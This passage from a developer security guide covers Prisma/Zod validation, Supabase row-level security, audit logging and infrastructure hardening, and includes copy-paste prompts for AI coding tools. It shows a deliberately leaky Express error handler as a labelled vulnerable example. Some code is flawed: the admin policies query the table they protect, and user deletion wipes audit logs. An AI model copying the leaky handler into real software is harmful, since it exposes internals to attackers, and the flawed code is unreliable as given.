│     └──► User only sees their own data, regardless of            │
│          what the application code requests                      │
│                                                                  │
│  KEY INSIGHT: RLS works at the DATABASE level.                   │
│  Even if your application code has IDOR bugs,                    │
│  RLS prevents unauthorized data access.                          │
└──────────────────────────────────────────────────────────────────┘
```

### Prisma + Zod: The Type-Safe Input Validation Pipeline

```
┌──────────────────────────────────────────────────────────────────┐
│              VALIDATION PIPELINE                                 │
│                                                                  │
│  [Client JSON]                                                   │
│     │                                                            │
│     │  {"name": "John", "email": "x@y.com", "role": "admin"}   │
│     │                                                            │
│     ▼                                                            │
│  [Zod Schema Validation]                                         │
│     │                                                            │
│     │  const createUserSchema = z.object({                       │
│     │    name: z.string().min(1).max(100),                       │
│     │    email: z.string().email(),                              │
│     │    // NOTE: 'role' is NOT in the schema                    │
│     │    // Zod will STRIP it automatically                      │
│     │  });                                                       │
│     │                                                            │
│     │  Result: { name: "John", email: "x@y.com" }               │
│     │  'role: admin' is STRIPPED. Not passed to Prisma.          │
│     │                                                            │
│     ▼                                                            │
│  [Prisma ORM]                                                    │
│     │                                                            │
│     │  await db.user.create({                                    │
│     │    data: validatedData,  // Only name + email               │
│     │  });                                                       │
│     │                                                            │
│     │  Prisma generates parameterized SQL:                       │
│     │  INSERT INTO users (name, email)                           │
│     │  VALUES ($1, $2)  -- ← Parameterized, not concatenated    │
│     │                                                            │
│     ▼                                                            │
│  [PostgreSQL]                                                    │
│     │                                                            │
│     │  Even if Zod is bypassed, PostgreSQL's prepared            │
│     │  statements prevent SQL injection.                         │
│     │  Even if Prisma is bypassed, RLS prevents                  │
│     │  unauthorized data access.                                 │
│                                                                  │
│  RESULT: Defense-in-depth. Each layer catches what               │
│          the previous layer missed.                               │
└──────────────────────────────────────────────────────────────────┘
```

---

## 3.3 Master Prompt: AI-Enforced Database Security

> **Copy this prompt into Cursor, ChatGPT, or Claude exactly as written.**

### The Prompt

```
You are a database security architect with deep expertise in
Prisma, PostgreSQL, and Supabase Row Level Security. Your code
must prevent SQL injection, NoSQL injection, mass assignment,
and unauthorized data access.

Write a complete, production-ready database security layer for a
Next.js application using Prisma ORM and PostgreSQL that implements
ALL of the following:

MANDATORY SECURITY REQUIREMENTS:

1. ZOD INPUT VALIDATION:
   - Define Zod schemas for EVERY database operation (create, update,
     delete, query).
   - Use strict mode: reject or strip unknown fields (prevent mass
     assignment).
   - Validate string lengths, email formats, UUID formats, dates,
     and numeric ranges.
   - Use `.trim()` and `.toLowerCase()` on strings where appropriate.
   - All schemas must export their TypeScript types using `z.infer`.

2. PRISMA ORM USAGE:
   - NEVER use raw SQL queries with string interpolation.
   - NEVER use `$queryRaw` with user input.
   - Always use Prisma's query builder methods (findMany, create,
     update, etc.).
   - For complex queries, use Prisma's `where` clause builders.
   - Use `select` to explicitly pick returned fields — NEVER return
     password hashes, tokens, or internal IDs unless required.
   - Use transactions for multi-step operations.

3. ROW LEVEL SECURITY (Supabase/PostgreSQL):
   - Create RLS policies for ALL user-facing tables.
   - Policy: "Users can only SELECT their own data"
     (WHERE user_id = auth.uid())
   - Policy: "Users can only INSERT for themselves"
     (WITH CHECK user_id = auth.uid())
   - Policy: "Users can only UPDATE their own data"
     (USING user_id = auth.uid())
   - Policy: "Users can only DELETE their own data"
     (WITH CHECK user_id = auth.uid())
   - Admin bypass: Use a separate role or policy for admin access.
   - Test that RLS is ENABLED on all tables.

4. MASS ASSIGNMENT PREVENTION:
   - Create a `whitelistFields` utility function that extracts only
     allowed fields from request body.
   - Apply this utility to EVERY route that writes to the database.
   - Never spread `req.body` directly into Prisma `data` parameter.
   - Log rejected fields for security monitoring.

5. SENSITIVE FIELD PROTECTION:
   - Password hashes: NEVER returned in any query result.
   - Use `select: { id: true, name: true, email: true }` pattern.
   - Create Prisma "view" models for safe data shapes.
   - Implement field-level encryption for PII (SSN, phone, address).

6. DATABASE AUDIT LOGGING:
   - Create an `audit_log` table with: id, userId, action, table,
     recordId, oldValues, newValues, ipAddress, userAgent, timestamp.
   - Log ALL create, update, delete operations on sensitive tables.
   - Use Prisma middleware to auto-log operations.

7. TYPE SAFETY:
   - Define TypeScript types for all database models.
   - Use strict typing throughout. No `any` types.
   - All Zod schemas must export inferred types.

Output format: Complete, copy-paste-ready TypeScript files with clear
file path comments. Include the Zod schemas, Prisma schema, RLS
policies, audit middleware, and utility functions.
```

---

## 3.4 Production Code: Database Security Implementation

### File: `schemas/user.ts`

```typescript
// schemas/user.ts — Zod validation schemas for user operations

import { z } from 'zod';

// ─── Create User Schema ────────────────────────────────────────
export const createUserSchema = z.object({
  name: z
    .string()
    .trim()
    .min(1, 'Name is required')
    .max(100, 'Name must be 100 characters or less')
    .regex(/^[a-zA-Z\s'-]+$/, 'Name contains invalid characters'),
  email: z
    .string()
    .trim()
    .toLowerCase()
    .email('Invalid email format')
    .max(255, 'Email must be 255 characters or less'),
  password: z
    .string()
    .min(12, 'Password must be at least 12 characters')
    .max(128, 'Password must be 128 characters or less')
    .regex(
      /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&#])[\w@$!%*?&#]+$/,
      'Password must contain uppercase, lowercase, number, and special character'
    ),
  role: z.enum(['user', 'viewer']).default('user'),
});

export type CreateUserInput = z.infer<typeof createUserSchema>;

// ─── Update User Schema ────────────────────────────────────────
// CRITICAL: This schema only allows specific fields to be updated.
// 'role', 'id', 'createdAt', 'passwordHash' are NOT included.
// This prevents mass assignment attacks.
export const updateUserSchema = z
  .object({
    name: z
      .string()
      .trim()
      .min(1, 'Name is required')
      .max(100, 'Name must be 100 characters or less')
      .regex(/^[a-zA-Z\s'-]+$/, 'Name contains invalid characters')
      .optional(),
    email: z
      .string()
      .trim()
      .toLowerCase()
      .email('Invalid email format')
      .max(255, 'Email must be 255 characters or less')
      .optional(),
    bio: z.string().trim().max(500, 'Bio must be 500 characters or less').optional(),
    avatarUrl: z.string().url('Invalid avatar URL').max(500).optional(),
  })
  .strict()  // REJECTS unknown fields — prevents mass assignment
  .refine((data) => Object.keys(data).length > 0, {
    message: 'At least one field must be provided for update',
  });

export type UpdateUserInput = z.infer<typeof updateUserSchema>;

// ─── Query User Schema ─────────────────────────────────────────
export const queryUserSchema = z.object({
  id: z.string().uuid('Invalid user ID format').optional(),
  email: z.string().trim().toLowerCase().email('Invalid email').optional(),
  name: z.string().trim().min(1).max(100).optional(),
  page: z.coerce.number().int().min(1).default(1),
  limit: z.coerce.number().int().min(1).max(100).default(20),
  sortBy: z.enum(['name', 'email', 'createdAt']).default('createdAt'),
  sortOrder: z.enum(['asc', 'desc']).default('desc'),
});

export type QueryUserInput = z.infer<typeof queryUserSchema>;

// ─── Delete User Schema ────────────────────────────────────────
export const deleteUserSchema = z.object({
  userId: z.string().uuid('Invalid user ID format'),
  confirmDeletion: z.literal(true, {
    errorMap: () => ({ message: 'You must confirm deletion by setting confirmDeletion to true' }),
  }),
});

export type DeleteUserInput = z.infer<typeof deleteUserSchema>;

// ─── Utility: Whitelist Fields ──────────────────────────────────
/**
 * Extract only allowed fields from request body.
 * This is the primary defense against mass assignment attacks.
 *
 * @param body - The raw request body
 * @param allowedFields - Array of field names that are allowed
 * @returns Object with only the allowed fields
 */
export function whitelistFields<T extends Record<string, unknown>>(
  body: Record<string, unknown>,
  allowedFields: string[]
): T {
  const whitelisted: Record<string, unknown> = {};
  const rejectedFields: string[] = [];

  for (const field of allowedFields) {
    if (field in body) {
      whitelisted[field] = body[field];
    }
  }

  // Log rejected fields for security monitoring
  for (const key of Object.keys(body)) {
    if (!allowedFields.includes(key)) {
      rejectedFields.push(key);
    }
  }

  if (rejectedFields.length > 0) {
    console.warn(
      `[SECURITY] Mass assignment blocked. Rejected fields: ${rejectedFields.join(', ')}`
    );
  }

  return whitelisted as T;
}
```

### File: `prisma/schema.prisma`

```prisma
// prisma/schema.prisma — Database schema with RLS-ready design

generator client {
  provider = "prisma-client-js"
}

datasource db {
  provider = "postgresql"
  url      = env("DATABASE_URL")
}

model User {
  id           String   @id @default(uuid())
  email        String   @unique
  name         String
  passwordHash String   @map("password_hash")
  role         String   @default("user")
  bio          String?  @db.Text
  avatarUrl    String?  @map("avatar_url")
  createdAt    DateTime @default(now()) @map("created_at")
  updatedAt    DateTime @updatedAt @map("updated_at")

  orders       Order[]
  files        File[]
  auditLogs    AuditLog[]

  @@map("users")
}

model Order {
  id          String   @id @default(uuid())
  userId      String   @map("user_id")
  title       String
  amount      Decimal  @db.Decimal(10, 2)
  status      String   @default("pending")
  createdAt   DateTime @default(now()) @map("created_at")
  updatedAt   DateTime @updatedAt @map("updated_at")

  user        User     @relation(fields: [userId], references: [id])

  @@index([userId])
  @@map("orders")
}

model File {
  id               String   @id @default(uuid())
  userId           String   @map("user_id")
  cleanKey         String   @map("clean_key")
  originalFilename String   @map("original_filename")
  mimeType         String   @map("mime_type")
  size             Int
  width            Int?
  height           Int?
  purpose          String
  cdnUrl           String   @map("cdn_url")
  createdAt        DateTime @default(now()) @map("created_at")

  user             User     @relation(fields: [userId], references: [id])

  @@index([userId])
  @@map("files")
}

model AuditLog {
  id         String   @id @default(uuid())
  userId     String?  @map("user_id")
  action     String
  table      String
  recordId   String?  @map("record_id")
  oldValues  Json?    @map("old_values")
  newValues  Json?    @map("new_values")
  ipAddress  String?  @map("ip_address")
  userAgent  String?  @map("user_agent")
  createdAt  DateTime @default(now()) @map("created_at")

  user       User?    @relation(fields: [userId], references: [id])

  @@index([userId])
  @@index([table, recordId])
  @@index([createdAt])
  @@map("audit_logs")
}
```

### File: `lib/rls-policies.sql`

```sql
-- lib/rls-policies.sql — Row Level Security policies for Supabase/PostgreSQL
-- Execute this AFTER creating your tables

-- Enable RLS on ALL user-facing tables
ALTER TABLE users ENABLE ROW LEVEL SECURITY;
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;
ALTER TABLE files ENABLE ROW LEVEL SECURITY;

-- ─── USERS TABLE POLICIES ─────────────────────────────────────

-- Users can read their own profile
CREATE POLICY "users_select_own" ON users
  FOR SELECT
  USING (id = auth.uid());

-- Users can update their own profile (not role or id)
CREATE POLICY "users_update_own" ON users
  FOR UPDATE
  USING (id = auth.uid())
  WITH CHECK (id = auth.uid());

-- Users cannot delete their own account via RLS
-- Account deletion must go through application logic
-- (to handle cascade deletes properly)

-- Admin can read all users
CREATE POLICY "admin_select_all_users" ON users
  FOR SELECT
  USING (
    EXISTS (
      SELECT 1 FROM users
      WHERE id = auth.uid() AND role = 'admin'
    )
  );

-- ─── ORDERS TABLE POLICIES ─────────────────────────────────────

-- Users can read their own orders
CREATE POLICY "orders_select_own" ON orders
  FOR SELECT
  USING (user_id = auth.uid());

-- Users can create orders for themselves
CREATE POLICY "orders_insert_own" ON orders
  FOR INSERT
  WITH CHECK (user_id = auth.uid());

-- Users can update their own orders (limited to status changes)
CREATE POLICY "orders_update_own" ON orders
  FOR UPDATE
  USING (user_id = auth.uid())
  WITH CHECK (user_id = auth.uid());

-- Users cannot delete orders (handled by application logic)
-- This prevents accidental or malicious order deletion

-- Admin can read all orders
CREATE POLICY "admin_select_all_orders" ON orders
  FOR SELECT
  USING (
    EXISTS (
      SELECT 1 FROM users
      WHERE id = auth.uid() AND role = 'admin'
    )
  );

-- ─── FILES TABLE POLICIES ──────────────────────────────────────

-- Users can read their own files
CREATE POLICY "files_select_own" ON files
  FOR SELECT
  USING (user_id = auth.uid());

-- Users can insert files for themselves
CREATE POLICY "files_insert_own" ON files
  FOR INSERT
  WITH CHECK (user_id = auth.uid());

-- Users can delete their own files
CREATE POLICY "files_delete_own" ON files
  FOR DELETE
  USING (user_id = auth.uid());

-- Admin can read all files
CREATE POLICY "admin_select_all_files" ON files
  FOR SELECT
  USING (
    EXISTS (
      SELECT 1 FROM users
      WHERE id = auth.uid() AND role = 'admin'
    )
  );

-- ─── AUDIT LOG POLICIES ────────────────────────────────────────

-- Only admins can read audit logs
CREATE POLICY "admin_select_audit_logs" ON audit_logs
  FOR SELECT
  USING (
    EXISTS (
      SELECT 1 FROM users
      WHERE id = auth.uid() AND role = 'admin'
    )
  );

-- Application can insert audit logs (using service role)
-- This policy allows the service_role to insert logs
CREATE POLICY "service_insert_audit_logs" ON audit_logs
  FOR INSERT
  WITH CHECK (true);

-- ─── VERIFY RLS IS ENABLED ────────────────────────────────────
-- Run this query to verify all tables have RLS enabled:
-- SELECT schemaname, tablename, rowsecurity
-- FROM pg_tables
-- WHERE schemaname = 'public';
```

### File: `lib/prisma-audit.ts`

```typescript
// lib/prisma-audit.ts — Prisma middleware for automatic audit logging

import { Prisma } from '@prisma/client';
import { db } from './database';

/**
 * Action types for audit logging
 */
export type AuditAction = 'CREATE' | 'UPDATE' | 'DELETE';

/**
 * Audit logging middleware for Prisma.
 * Automatically logs all mutations to sensitive tables.
 *
 * Usage:
 *   import { auditMiddleware } from './prisma-audit';
 *   prisma.$use(auditMiddleware);
 */
export const auditMiddleware: Prisma.Middleware = async (params, next) => {
  const { action, model, args } = params;

  // Only log mutations on sensitive tables
  const sensitiveTables = ['User', 'Order', 'File'];

  if (!model || !sensitiveTables.includes(model)) {
    return next(params);
  }

  // Determine the audit action
  let auditAction: AuditAction;
  switch (action) {
    case 'create':
      auditAction = 'CREATE';
      break;
    case 'update':
    case 'upsert':
      auditAction = 'UPDATE';
      break;
    case 'delete':
      auditAction = 'DELETE';
      break;
    default:
      return next(params);
  }

  // Get the result
  const result = await next(params);

  // Extract record ID
  let recordId: string | null = null;
  let oldValues: Record<string, unknown> | null = null;
  let newValues: Record<string, unknown> | null = null;

  if (auditAction === 'CREATE' && result) {
    recordId = result.id;
    newValues = result;
  } else if (auditAction === 'UPDATE' && result) {
    recordId = result.id;
    newValues = result;
    // For updates, we'd need to fetch old values separately
    // This is a simplified version
  } else if (auditAction === 'DELETE' && args?.where) {
    recordId = (args.where as any).id;
  }

  // Create audit log entry
  try {
    await db.auditLog.create({
      data: {
        action: auditAction,
        table: model,
        recordId,
        oldValues: oldValues ? JSON.stringify(oldValues) : null,
        newValues: newValues ? JSON.stringify(newValues) : null,
        // Note: IP and user agent should be set from middleware context
        // This requires passing request context through Prisma
      },
    });
  } catch (error) {
    // Never let audit logging failures break the main operation
    console.error('[AUDIT] Failed to create audit log:', error);
  }

  return result;
};

/**
 * Manual audit logging function.
 * Use this for operations that bypass Prisma or need custom logging.
 */
export async function logAuditEvent(params: {
  userId?: string;
  action: AuditAction;
  table: string;
  recordId?: string;
  oldValues?: Record<string, unknown>;
  newValues?: Record<string, unknown>;
  ipAddress?: string;
  userAgent?: string;
}): Promise<void> {
  try {
    await db.auditLog.create({
      data: {
        userId: params.userId,
        action: params.action,
        table: params.table,
        recordId: params.recordId,
        oldValues: params.oldValues ? JSON.stringify(params.oldValues) : null,
        newValues: params.newValues ? JSON.stringify(params.newValues) : null,
        ipAddress: params.ipAddress,
        userAgent: params.userAgent,
      },
    });
  } catch (error) {
    console.error('[AUDIT] Failed to log audit event:', error);
  }
}

/**
 * Query audit logs with filtering and pagination.
 * Only accessible to admin users.
 */
export async function queryAuditLogs(params: {
  userId?: string;
  table?: string;
  action?: AuditAction;
  startDate?: Date;
  endDate?: Date;
  page?: number;
  limit?: number;
}): Promise<{
  logs: Array<{
    id: string;
    userId: string | null;
    action: string;
    table: string;
    recordId: string | null;
    ipAddress: string | null;
    createdAt: Date;
  }>;
  total: number;
  page: number;
  totalPages: number;
}> {
  const page = params.page || 1;
  const limit = Math.min(params.limit || 20, 100);
  const skip = (page - 1) * limit;

  const where: Record<string, unknown> = {};

  if (params.userId) where.userId = params.userId;
  if (params.table) where.table = params.table;
  if (params.action) where.action = params.action;
  if (params.startDate || params.endDate) {
    where.createdAt = {};
    if (params.startDate) (where.createdAt as any).gte = params.startDate;
    if (params.endDate) (where.createdAt as any).lte = params.endDate;
  }

  const [logs, total] = await Promise.all([
    db.auditLog.findMany({
      where,
      select: {
        id: true,
        userId: true,
        action: true,
        table: true,
        recordId: true,
        ipAddress: true,
        createdAt: true,
      },
      orderBy: { createdAt: 'desc' },
      skip,
      take: limit,
    }),
    db.auditLog.count({ where }),
  ]);

  return {
    logs,
    total,
    page,
    totalPages: Math.ceil(total / limit),
  };
}
```

### File: `lib/db-queries.ts`

```typescript
// lib/db-queries.ts — Secure database query patterns

import { db } from './database';
import type { CreateUserInput, UpdateUserInput, QueryUserInput } from '../schemas/user';

/**
 * Create a new user with secure defaults.
 * Password is hashed before storage. No sensitive data is returned.
 */
export async function createUser(input: CreateUserInput) {
  const bcrypt = require('bcrypt');

  // Hash password with strong salt rounds
  const passwordHash = await bcrypt.hash(input.password, 12);

  // NEVER return passwordHash in the result
  const user = await db.user.create({
    data: {
      name: input.name,
      email: input.email,
      passwordHash,
      role: input.role,
    },
    select: {
      id: true,
      name: true,
      email: true,
      role: true,
      createdAt: true,
      // passwordHash is intentionally NOT selected
    },
  });

  return user;
}

/**
 * Query users with secure filtering and pagination.
 * Returns only non-sensitive fields.
 */
export async function queryUsers(input: QueryUserInput) {
  const where: Record<string, unknown> = {};

  if (input.id) where.id = input.id;
  if (input.email) where.email = input.email;
  if (input.name) where.name = { contains: input.name, mode: 'insensitive' };

  const [users, total] = await Promise.all([
    db.user.findMany({
      where,
      select: {
        id: true,
        name: true,
        email: true,
        role: true,
        createdAt: true,
        // passwordHash is NEVER returned
      },
      orderBy: { [input.sortBy]: input.sortOrder },
      skip: (input.page - 1) * input.limit,
      take: input.limit,
    }),
    db.user.count({ where }),
  ]);

  return {
    users,
    total,
    page: input.page,
    totalPages: Math.ceil(total / input.limit),
  };
}

/**
 * Update a user with validated input.
 * Only whitelisted fields are updated.
 */
export async function updateUser(
  userId: string,
  input: UpdateUserInput
) {
  // Ensure user can only update their own profile
  // (RLS provides additional protection)
  const user = await db.user.update({
    where: { id: userId },
    data: input,  // Only contains whitelisted fields due to Zod strict mode
    select: {
      id: true,
      name: true,
      email: true,
      role: true,
      bio: true,
      avatarUrl: true,
      updatedAt: true,
    },
  });

  return user;
}

/**
 * Verify user credentials during login.
 * Returns user with password hash for comparison.
 */
export async function verifyCredentials(email: string, password: string) {
  const bcrypt = require('bcrypt');

  // Find user by email
  const user = await db.user.findUnique({
    where: { email: email.toLowerCase().trim() },
    select: {
      id: true,
      email: true,
      name: true,
      passwordHash: true,  // Needed for verification
      role: true,
    },
  });

  if (!user) {
    // Use same hash comparison to prevent timing attacks
    await bcrypt.hash('dummy', 12);
    return null;
  }

  const isValid = await bcrypt.compare(password, user.passwordHash);

  if (!isValid) {
    return null;
  }

  // Return user WITHOUT passwordHash
  return {
    id: user.id,
    email: user.email,
    name: user.name,
    role: user.role,
  };
}

/**
 * Delete a user and all associated data.
 * This should be wrapped in a transaction.
 */
export async function deleteUser(userId: string) {
  return db.$transaction(async (tx) => {
    // Delete associated data first
    await tx.order.deleteMany({ where: { userId } });
    await tx.file.deleteMany({ where: { userId } });
    await tx.auditLog.deleteMany({ where: { userId } });

    // Delete the user
    const deleted = await tx.user.delete({
      where: { id: userId },
      select: { id: true, email: true },
    });

    return deleted;
  });
}
```

---

### Module 3 Security Checklist

| # | Check | Status |
|---|---|---|
| 1 | All inputs validated with Zod schemas | ⬜ |
| 2 | Zod strict mode enabled (rejects unknown fields) | ⬜ |
| 3 | No raw SQL with string interpolation | ⬜ |
| 4 | Prisma parameterized queries used exclusively | ⬜ |
| 5 | RLS enabled on all user-facing tables | ⬜ |
| 6 | RLS policies enforce user_id = auth.uid() | ⬜ |
| 7 | Password hashes never returned in queries | ⬜ |
| 8 | Field-level select on all queries | ⬜ |
| 9 | Mass assignment prevented (whitelistFields utility) | ⬜ |
| 10 | Audit logging on sensitive table mutations | ⬜ |
| 11 | Database transactions for multi-step operations | ⬜ |
| 12 | Sensitive field encryption (PII) | ⬜ |
| 13 | TypeScript strict typing, no `any` types | ⬜ |
| 14 | Error messages don't leak database structure | ⬜ |
| 15 | Admin access uses separate policy/role | ⬜ |

---

# MODULE 4: INFRASTRUCTURE HARDENING & RATE LIMITING

## Pages 13–16 | Your Server Is Not a Public Playground

---

## 4.1 Threat Vector Analysis

Infrastructure vulnerabilities are the silent killers. They don't show up in penetration tests until an attacker is already inside. DDoS attacks, verbose error disclosure, and missing security headers create attack surfaces that compound over time.

### Attack Surface Map

| Attack Vector | Severity | Prevalence | Impact |
|---|---|---|---|
| **DDoS / API Abuse** | Critical | Very High | Service degradation/outage |
| **Memory Leaks** | High | High | Server crash, DoS |
| **Verbose Error Disclosure** | Medium | Very High | Information leakage |
| **Missing Security Headers** | High | Very High | XSS, clickjacking, MIME sniffing |
| **CORS Misconfiguration** | High | High | Cross-origin data theft |
| **Server Information Disclosure** | Medium | High | Attack surface reconnaissance |
| **Slowloris Attacks** | Medium | Medium | Connection pool exhaustion |

### The Verbose Error Catastrophe

```javascript
// THE VERBOSE ERROR LEAK — How AI code often exposes internals

// VULNERABLE: AI-generated error handling that leaks everything
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    error: err.message,          // ← LEAKS: "Connection refused to
                                 //   PostgreSQL at db.internal.com:5432"
    stack: err.stack,            // ← LEAKS: Full stack trace with
                                 //   file paths, line numbers, function names
    query: err.query,            // ← LEAKS: SQL query structure
    code: err.code,              // ← LEAKS: Database error codes
  });
});

// RESULT: Attacker learns:
// - Database host (db.internal.com:5432)
// - Application file structure (/app/src/services/user.service.ts:42)
// - ORM being used (Prisma)
// - Database type (PostgreSQL)
// - Query patterns (SELECT * FROM users WHERE...)
// - Library versions (prisma@5.10.0, express@4.18.2)
//
// This information is FUEL for targeted attacks.
```

```
┌─────────────────────────────────────────────────────────────────┐
│              INFORMATION DISCLOSURE ATTACK CHAIN                 │
│                                                                  │
│  [Attacker] triggers error in API                               │
│       │                                                          │
│       ▼                                                          │
│  [Server] returns verbose error with stack trace                 │
│       │                                                          │
│       ├──► Leaks: /app/src/services/user.service.ts:42          │
│       ├──► Leaks: PrismaClientKnownRequestError                 │
│       ├──► Leaks: postgres://user:pass@db.internal:5432/app    │
│       └──► Leaks: Node.js v18.17.0, Express v4.18.2            │
│                                                                  │
│  [Attacker] uses leaked info to:                                 │
│       │                                                          │
│       ├──► Target specific file/function for code injection      │
│       ├──► Exploit known Prisma vulnerability (CVE-XXXX-XXXX)   │
│       ├──► Attack database directly (if network accessible)      │
│       └──► Craft targeted SQL injection using query patterns     │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## 4.2 Architectural Deep Dive: Infrastructure Security Layers

### The Complete Security Response Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│              SECURITY RESPONSE ARCHITECTURE                      │
│                                                                  │
│  [Client Request]                                                │
│     │                                                            │
│     ▼                                                            │
│  [Layer 1: CDN / Edge]                                           │
│  ┌────────────────────────────────────────────────┐              │
│  │  • DDoS mitigation (Cloudflare/AWS Shield)     │              │
│  │  • Geo-blocking (if applicable)                 │              │
│  │  • Bot detection                                │              │
│  │  • SSL/TLS termination                          │              │
│  └────────────────────────────────────────────────┘              │
│     │                                                            │
│     ▼                                                            │
│  [Layer 2: Rate Limiter (Redis-backed)]                          │
│  ┌────────────────────────────────────────────────┐              │
│  │  • IP-based rate limiting                       │              │
│  │  • User-based rate limiting                     │              │
│  │  • Endpoint-specific limits                     │              │
│  │  • Sliding window algorithm                     │              │
│  │  • Returns 429 with Retry-After header          │              │
│  └────────────────────────────────────────────────┘              │
│     │                                                            │
│     ▼                                                            │
│  [Layer 3: Security Headers Middleware]                          │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Content-Security-Policy                      │              │
│  │  • Strict-Transport-Security                    │              │
│  │  • X-Content-Type-Options                       │              │
│  │  • X-Frame-Options                              │              │
│  │  • X-XSS-Protection                             │              │
│  │  • Referrer-Policy                              │              │
│  │  • Permissions-Policy                           │              │
│  │  • CORS configuration                           │              │
│  └────────────────────────────────────────────────┘              │
│     │                                                            │
│     ▼                                                            │
│  [Layer 4: Request Validation]                                   │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Content-Type validation                      │              │
│  │  • Request size limits                          │              │
│  │  • Input sanitization                           │              │
│  │  • SQL injection prevention                     │              │
│  └────────────────────────────────────────────────┘              │
│     │                                                            │
│     ▼                                                            │
│  [Layer 5: Authentication & Authorization]                       │
│  ┌────────────────────────────────────────────────┐              │
│  │  • JWT verification                             │              │
│  │  • Role-based access control                    │              │
│  │  • Session validation                           │              │
│  └────────────────────────────────────────────────┘              │
│     │                                                            │
│     ▼                                                            │
│  [Layer 6: Global Exception Handler]                             │
│  ┌────────────────────────────────────────────────┐              │
│  │  • Catches ALL unhandled errors                  │              │
│  │  • Logs full error server-side                   │              │
│  │  • Returns GENERIC error to client               │              │
│  │  • NEVER exposes stack traces or internals       │              │
│  │  • Includes correlation ID for debugging         │              │
│  └────────────────────────────────────────────────┘              │
│     │                                                            │
│     ▼                                                            │
│  [Application Logic]                                             │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Redis-Based Rate Limiting Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│              RATE LIMITING FLOW                                  │
│                                                                  │
│  [Client] sends request                                          │
│     │                                                            │
│     ▼                                                            │
│  [Rate Limiter Middleware]                                        │
│     │                                                            │
│     │  1. Extract rate limit key:                                │
│     │     - By IP: rate_limit:ip:192.168.1.1                     │
│     │     - By User: rate_limit:user:user-uuid                   │
│     │     - By Endpoint: rate_limit:endpoint:/api/login          │
│     │                                                            │
│     │  2. Query Redis:                                            │
│     │     GET rate_limit:ip:192.168.1.1                          │
│     │                                                            │
│     │  3. Check against limit:                                    │
│     │     - Current count: 15                                    │
│     │     - Limit: 100 requests per minute                       │
│     │     - Remaining: 85                                        │
│     │                                                            │
│     │  4. If within limit:                                        │
│     │     - Increment counter                                    │
│     │     - Set expiry: EX 60 (60 seconds)                       │
│     │     - Continue to application                              │
│     │                                                            │
│     │  5. If exceeded:                                            │
│     │     - Return 429 Too Many Requests                         │
│     │     - Include Retry-After header                           │
│     │     - Log the rate limit hit                               │
│     │                                                            │
│     ▼                                                            │
│  [Redis]                                                         │
│     │                                                            │
│     │  INCR rate_limit:ip:192.168.1.1                           │
│     │  EXPIRE rate_limit:ip:192.168.1.1 60                      │
│     │                                                            │
│     └──► Atomic increment + expiry ensures no race conditions    │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### Security Headers Breakdown

```
┌──────────────────────────────────────────────────────────────────┐
│              SECURITY HEADERS MAP                                │
│                                                                  │
│  HEADER                        │ PURPOSE                         │
│  ──────────────────────────────│──────────────────────────────   │
│  Content-Security-Policy       │ Prevents XSS, data injection,  │
│                                │ clickjacking. Defines which     │
│                                │ resources can be loaded.        │
│                                │                                 │
│  Strict-Transport-Security     │ Forces HTTPS for 1 year.        │
│                                │ Prevents protocol downgrade.    │
│                                │                                 │
│  X-Content-Type-Options        │ Prevents MIME sniffing.         │
│  =nosniff                      │ Browser won't guess content     │
│                                │ type from file contents.        │
│                                │                                 │
│  X-Frame-Options               │ Prevents clickjacking.          │
│  =DENY                         │ Page cannot be in an iframe.    │
│                                │                                 │
│  X-XSS-Protection              │ Legacy XSS filter (deprecated   │
│  =0                            │ but still set for old browsers) │
│                                │                                 │
│  Referrer-Policy                │ Controls how much referrer      │
│  =strict-origin-...            │ info is sent with requests.     │
│                                │                                 │
│  Permissions-Policy            │ Restricts browser features:     │
│                                │ camera, microphone, geolocation │
│                                │                                 │
│  Cache-Control                 │ Prevents caching of sensitive   │
│  =no-store, no-cache           │ responses (API data).           │
│                                │                                 │
│  Cross-Origin-Embedder-Policy  │ Isolates page from             │
│  =require-corp                 │ cross-origin resources.         │
│                                │                                 │
│  Cross-Origin-Opener-Policy    │ Isolates browsing context.      │
│  =same-origin                  │ Prevents cross-origin attacks.  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 4.3 Master Prompt: AI-Enforced Infrastructure Hardening

> **Copy this prompt into Cursor, ChatGPT, or Claude exactly as written.**

### The Prompt

```
You are a senior DevOps/security engineer specializing in Node.js
backend hardening. Your code must prevent DDoS, information disclosure,
and common infrastructure attacks.

Write a complete, production-ready infrastructure hardening layer for
a Node.js/Express/Next.js backend that implements ALL of the following:

MANDATORY SECURITY REQUIREMENTS:

1. REDIS RATE LIMITING:
   - Use Upstash Redis (serverless-friendly) for rate limit storage.
   - Implement sliding window rate limiting.
   - Three tiers:
     * Global: 1000 requests per minute per IP
     * Auth endpoints: 10 requests per minute per IP
     * API endpoints: 100 requests per minute per user
   - Return HTTP 429 with Retry-After header when exceeded.
   - Log rate limit violations with IP, user agent, endpoint.
   - Use atomic Redis operations (INCR + EXPIRE).

2. SECURITY RESPONSE HEADERS:
   - Implement ALL security headers via middleware:
     * Content-Security-Policy (restrictive default-src)
     * Strict-Transport-Security (max-age=63072000)
     * X-Content-Type-Options: nosniff
     * X-Frame-Options: DENY
     * X-XSS-Protection: 0 (use CSP instead)
     * Referrer-Policy: strict-origin-when-cross-origin
     * Permissions-Policy: camera=(), microphone=(), geolocation=()
     * Cache-Control: no-store for API responses
   - Headers must be set on ALL responses (not just errors).

3. CORS CONFIGURATION:
   - Whitelist specific origins (NEVER use "*" for authenticated APIs).
   - Allow only necessary HTTP methods.
   - Allow only necessary headers.
   - Expose only necessary response headers.
   - Support credentials (cookies) with explicit origin.
   - Log CORS preflight requests for monitoring.

4. GLOBAL EXCEPTION HANDLER:
   - Catch ALL unhandled errors (synchronous and asynchronous).
   - Log full error details server-side (stack trace, request context).
   - Return GENERIC error to client: { error: { code: "INTERNAL_ERROR",
     message: "An unexpected error occurred" } }.
   - NEVER expose: stack traces, file paths, database errors,
     library versions, internal hostnames.
   - Include a correlation ID (UUID) for error tracking.
   - Handle specific error types: AuthError, ValidationError,
     NotFoundError with appropriate status codes.

